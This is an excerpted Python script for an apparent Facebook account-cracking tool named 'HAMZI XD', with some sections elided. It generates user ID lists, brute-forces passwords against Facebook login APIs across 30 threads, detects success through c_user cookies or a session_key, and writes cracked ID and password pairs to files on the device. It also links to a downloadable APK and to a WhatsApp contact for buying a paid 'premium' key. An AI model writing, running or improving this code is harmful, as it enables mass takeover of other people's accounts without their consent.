...
os.system('xdg-open https://www.facebook.com/Hamza.khan.g.koko?mibextid=ZbWKwL/')
...
----------------------------------------------
 Author    : HAMZA KHAN
 Github    : NOT FOUND
 Facebook  : Muhammad hamza khan
 Tool Name : HAMZI XD
 Type type : FREE
 Version   : 0.1
----------------------------------------------
 HAMZA XD 0.1 VERSION
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                clear()
                                print(' Put file example:  /sdcard/File name.txt  etc..')
                                linex()
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/HAMZI_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923499406036&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi hamzi Sir, I Need To Buy Your Paid HAMZI XD Tools Version 0.1 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python HAMZI.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as HAMZI:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                HAMZI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: , HAMZI, SODHAIR, DADA SARKAR\033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [HAMZI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        HAMZI=session.cookies.get_dict().keys()
                        if "c_user" in HAMZI:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [HAMZI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/HAMZI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in HAMZI:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [HAMZI-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAMZI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [HAMZIG-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [HAMZI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAMZI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/HAMZI-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [HAMZI-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/HAMZI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [HAMZI-OK] '+uid+' | '+pas+'\033[1;97m')
